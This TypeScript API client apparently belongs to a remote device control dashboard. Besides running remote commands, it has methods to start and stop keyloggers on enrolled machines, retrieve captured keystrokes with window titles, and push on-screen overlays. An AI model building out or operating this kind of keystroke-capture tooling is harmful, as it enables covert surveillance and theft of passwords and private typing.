const API_URL = import.meta.env.VITE_API_URL || '';

export interface Device {
  id: string;
  hostname: string;
  os: string;
  arch: string | null;
  ip: string | null;
  online: boolean;
  last_seen: string | null;
  registered_at: string;
}

export interface CommandResponse {
  command_id: string;
  status: string;
}

export interface CommandResult {
  command_id: string;
  device_id: string;
  type: string;
  exit_code: number;
  output: string[];
  error: string | null;
  duration_ms: number;
  timestamp: string;
}

class ApiClient {
  private token: string | null = null;

  setToken(token: string | null) {
    this.token = token;
  }

  private async fetch<T>(path: string, options: RequestInit = {}): Promise<T> {
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      ...(options.headers as Record<string, string>),
    };

    if (this.token) {
      headers['Authorization'] = `Bearer ${this.token}`;
    }

    const response = await fetch(`${API_URL}${path}`, {
      ...options,
      headers,
    });

    if (!response.ok) {
      const error = await response.json().catch(() => ({ detail: 'Unknown error' }));
      throw new Error(error.detail || `HTTP ${response.status}`);
    }

    return response.json();
  }

  async login(username: string, password: string): Promise<string> {
    const data = await this.fetch<{ access_token: string }>('/api/auth/token', {
      method: 'POST',
      body: JSON.stringify({ username, password }),
    });
    this.token = data.access_token;
    return data.access_token;
  }

  async getDevices(): Promise<Device[]> {
    const data = await this.fetch<{ devices: Device[] }>('/api/devices');
    return data.devices;
  }

  async getDevice(id: string): Promise<Device> {
    return this.fetch<Device>(`/api/devices/${id}`);
  }

  async sendCommand(deviceId: string, type: string, payload?: string): Promise<CommandResponse> {
    return this.fetch<CommandResponse>(`/api/devices/${deviceId}/command`, {
      method: 'POST',
      body: JSON.stringify({ type, payload }),
    });
  }

  async getCommandResult(commandId: string): Promise<CommandResult> {
    return this.fetch<CommandResult>(`/api/commands/${commandId}/result`);
  }

  async getCommandHistory(deviceId: string, limit = 50): Promise<CommandResult[]> {
    return this.fetch<CommandResult[]>(`/api/devices/${deviceId}/history?limit=${limit}`);
  }

  // Keylogger methods
  async startKeylogger(deviceId: string): Promise<{status: string; message: string; session_id?: string}> {
    return this.fetch(`/api/devices/${deviceId}/keylogger/start`, {
      method: 'POST',
      body: JSON.stringify({ device_id: deviceId }),
    });
  }

  async stopKeylogger(deviceId: string): Promise<{status: string; message: string}> {
    return this.fetch(`/api/devices/${deviceId}/keylogger/stop`, {
      method: 'POST',
    });
  }

  async getKeyloggerStatus(deviceId: string): Promise<{status: string; is_running: boolean; session_id?: string; keylog_count?: number}> {
    return this.fetch(`/api/devices/${deviceId}/keylogger/status`);
  }

  async getKeylogs(deviceId: string, startDate?: string, endDate?: string, sessionId?: string): Promise<{keylogs: Array<{id: string; timestamp: string; key: string; window_title?: string}>}> {
    const params = new URLSearchParams();
    if (startDate) params.append('start_date', startDate);
    if (endDate) params.append('end_date', endDate);
    if (sessionId) params.append('session_id', sessionId);
    
    return this.fetch(`/api/devices/${deviceId}/keylogs?${params.toString()}`);
  }

  async getKeyloggerSessions(deviceId: string): Promise<{sessions: Array<{id: string; started_at: string; stopped_at?: string; started_by: string; status: string}>}> {
    return this.fetch(`/api/devices/${deviceId}/keylogger/sessions`);
  }

  // Overlay methods
  async spawnOverlay(deviceId: string, config?: Record<string, any>): Promise<{status: string; message: string; device_id: string}> {
    return this.fetch(`/api/devices/${deviceId}/overlay/spawn`, {
      method: 'POST',
      body: JSON.stringify(config || {}),
    });
  }

  async closeOverlay(deviceId: string): Promise<{status: string; message: string; device_id: string}> {
    return this.fetch(`/api/devices/${deviceId}/overlay/close`, {
      method: 'POST',
    });
  }

  async sendOverlayMessage(deviceId: string, content: string): Promise<{status: string; message: string; device_id: string}> {
    return this.fetch(`/api/devices/${deviceId}/overlay/message`, {
      method: 'POST',
      body: JSON.stringify({ content }),
    });
  }

  // Generic methods for custom endpoints
  async get<T>(path: string): Promise<T> {
    return this.fetch<T>(path);
  }

  async post<T>(path: string, data?: any): Promise<T> {
    return this.fetch<T>(path, {
      method: 'POST',
      body: data ? JSON.stringify(data) : undefined,
    });
  }

  async put<T>(path: string, data?: any): Promise<T> {
    return this.fetch<T>(path, {
      method: 'PUT',
      body: data ? JSON.stringify(data) : undefined,
    });
  }

  async delete<T>(path: string): Promise<T> {
    return this.fetch<T>(path, {
      method: 'DELETE',
    });
  }
}

export const api = new ApiClient();
